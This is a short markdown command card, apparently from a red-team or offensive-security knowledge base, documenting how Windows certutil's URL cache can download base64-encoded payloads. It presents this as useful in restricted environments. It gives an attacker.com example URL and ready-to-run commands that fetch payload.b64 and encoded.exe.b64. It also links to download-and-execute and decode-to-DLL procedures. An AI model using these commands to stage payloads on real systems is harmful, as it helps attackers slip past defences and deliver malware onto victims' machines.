---
type: command
executor: cmd
data: 'certutil -urlcache -split -f http://webserver/payload.b64 payload.b64'
output: null
platforms:
  - Windows
tags:
  - certutil
  - download
verified: true
validated: true
---

# certutil-download-base64-payload

## Command

```cmd
certutil -urlcache -split -f $_URL $_OUTPUT_FILE
```

## Description

Downloads a file from a specified URL using Certutil's URL cache functionality, treating it like a certificate download. Useful for fetching base64-encoded payloads in restricted environments.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_URL | Full HTTP URL to the payload file (e.g., http://attacker.com/payload.b64) | Yes |
| $_OUTPUT_FILE | Local filename to save the downloaded content (e.g., payload.b64) | Yes |
| -urlcache | Enables URL cache download mode | Built-in |
| -split | Splits large downloads into chunks for reliability | Built-in |
| -f | Forces overwrite if file exists | Built-in |

## Examples

### Basic Usage

```cmd
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
```

### Advanced Usage

```cmd
certutil -urlcache -split -f https://secure-server.com/encoded.exe.b64 temp.b64
```

## Expected Output

Certutil: -URLcache command completed successfully.

The file payload.b64 is created in the current directory. Verify with: dir payload.b64

## Related

- [[procedures/Certutil-Download-and-Execute]]
- [[commands/certutil-decode-base64-to-dll]]
